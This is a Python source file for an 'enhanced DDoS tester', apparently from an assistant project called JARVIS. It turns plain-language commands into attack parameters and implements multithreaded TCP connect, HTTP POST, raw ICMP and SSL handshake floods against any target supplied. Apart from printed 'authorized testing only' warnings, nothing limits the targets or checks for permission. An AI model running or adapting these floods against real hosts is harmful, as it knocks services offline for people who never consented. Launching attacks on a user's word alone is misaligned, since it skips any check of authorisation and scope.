"""
Enhanced DDoS Testing with Advanced Features
WARNING: For authorized testing only.
"""
import socket
import time
import random
import ssl
from typing import Dict, Optional
from concurrent.futures import ThreadPoolExecutor
import requests
from cybersecurity.improvements import ImprovedNLP, VSOCReporter, AttackMonitor
from cybersecurity.ddos_tester import DDoSTester


class EnhancedDDoSTester(DDoSTester):
    """Enhanced DDoS testing with better features"""
    
    def __init__(self, max_threads: int = 10):
        super().__init__(max_threads)
        self.nlp = ImprovedNLP()
        self.reporter = VSOCReporter()
        self.monitor = AttackMonitor()
    
    def parse_attack_command(self, command: str) -> Dict:
        """Parse natural language attack command"""
        command_lower = command.lower()
        
        # Extract target
        target_info = self.nlp.extract_target(command)
        if not target_info:
            raise ValueError("Could not extract target from command")
        
        target, port = target_info
        port = port or 80
        
        # Extract duration
        duration = self.nlp.extract_duration(command)
        
        # Extract intensity
        intensity = self.nlp.extract_intensity(command)
        
        # Determine attack type
        attack_type = "tcp"
        if "udp" in command_lower:
            attack_type = "udp"
        elif "http" in command_lower or "web" in command_lower:
            attack_type = "http"
        elif "slowloris" in command_lower or "slow" in command_lower:
            attack_type = "slowloris"
        elif "icmp" in command_lower or "ping" in command_lower:
            attack_type = "icmp"
        
        return {
            "target": target,
            "port": port,
            "duration": duration,
            "intensity": intensity,
            "type": attack_type
        }
    
    def advanced_tcp_flood(self, target: str, port: int, duration: int = 10, 
                          threads: int = 10, spoof_ip: bool = False) -> Dict:
        """Advanced TCP flood with options"""
        self.is_running = True
        self.monitor.start_monitoring()
        packets_sent = 0
        errors = 0
        start_time = time.time()
        
        def flood():
            nonlocal packets_sent, errors
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, port))
                    self.monitor.record_packet()
                    packets_sent += 1
                    sock.close()
                except Exception as e:
                    errors += 1
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(flood) for _ in range(threads)]
            time.sleep(duration)
            self.is_running = False
        
        stats = self.monitor.get_stats()
        
        result = {
            "type": "Advanced TCP Flood",
            "target": f"{target}:{port}",
            "duration": duration,
            "threads": threads,
            "packets_sent": packets_sent,
            "errors": errors,
            "packets_per_second": stats.get("packets_per_second", 0),
            "success_rate": (packets_sent / (packets_sent + errors)) * 100 if (packets_sent + errors) > 0 else 0,
            "warning": "Authorized testing only. Illegal without authorization."
        }
        
        # Generate VSOC report
        report = self.reporter.generate_report(result)
        result["report"] = report
        
        return result
    
    def http_flood(self, target_url: str, duration: int = 10, threads: int = 10) -> Dict:
        """HTTP GET flood (inherited from parent)"""
        return super().http_flood(target_url, duration)
    
    def http_post_flood(self, target_url: str, duration: int = 10, 
                       threads: int = 10, payload_size: int = 1024) -> Dict:
        """HTTP POST flood (more resource intensive)"""
        self.is_running = True
        self.monitor.start_monitoring()
        requests_sent = 0
        errors = 0
        start_time = time.time()
        
        payload = random.randbytes(payload_size)
        
        def flood():
            nonlocal requests_sent, errors
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    response = requests.post(
                        target_url,
                        data=payload,
                        timeout=2,
                        headers={'User-Agent': 'JARVIS-Test'}
                    )
                    self.monitor.record_packet()
                    requests_sent += 1
                except:
                    errors += 1
                time.sleep(0.1)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(flood) for _ in range(threads)]
            time.sleep(duration)
            self.is_running = False
        
        stats = self.monitor.get_stats()
        
        result = {
            "type": "HTTP POST Flood",
            "target": target_url,
            "duration": duration,
            "threads": threads,
            "requests_sent": requests_sent,
            "errors": errors,
            "requests_per_second": stats.get("packets_per_second", 0),
            "warning": "Authorized testing only."
        }
        
        report = self.reporter.generate_report(result)
        result["report"] = report
        
        return result
    
    def icmp_flood(self, target: str, duration: int = 10, threads: int = 10) -> Dict:
        """ICMP (Ping) flood"""
        self.is_running = True
        self.monitor.start_monitoring()
        packets_sent = 0
        errors = 0
        start_time = time.time()
        
        def flood():
            nonlocal packets_sent, errors
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    # Note: Requires root/admin on most systems
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.sendto(b'\x08\x00\x00\x00', (target, 0))
                    self.monitor.record_packet()
                    packets_sent += 1
                    sock.close()
                except PermissionError:
                    errors += 1
                    return  # Need root/admin
                except:
                    errors += 1
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(flood) for _ in range(threads)]
            time.sleep(duration)
            self.is_running = False
        
        stats = self.monitor.get_stats()
        
        result = {
            "type": "ICMP Flood",
            "target": target,
            "duration": duration,
            "packets_sent": packets_sent,
            "errors": errors,
            "note": "Requires root/admin privileges",
            "warning": "Authorized testing only."
        }
        
        return result
    
    def ssl_handshake_flood(self, target: str, port: int = 443, 
                           duration: int = 10, threads: int = 10) -> Dict:
        """SSL/TLS handshake flood (CPU intensive)"""
        self.is_running = True
        self.monitor.start_monitoring()
        handshakes = 0
        errors = 0
        start_time = time.time()
        
        def flood():
            nonlocal handshakes, errors
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    
                    context = ssl.create_default_context()
                    ssl_sock = context.wrap_socket(sock, server_hostname=target)
                    self.monitor.record_packet()
                    handshakes += 1
                    ssl_sock.close()
                except:
                    errors += 1
                time.sleep(0.1)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(flood) for _ in range(threads)]
            time.sleep(duration)
            self.is_running = False
        
        stats = self.monitor.get_stats()
        
        result = {
            "type": "SSL Handshake Flood",
            "target": f"{target}:{port}",
            "duration": duration,
            "handshakes": handshakes,
            "errors": errors,
            "warning": "Authorized testing only."
        }
        
        return result
    
    def stop(self):
        """Stop all attacks"""
        self.is_running = False
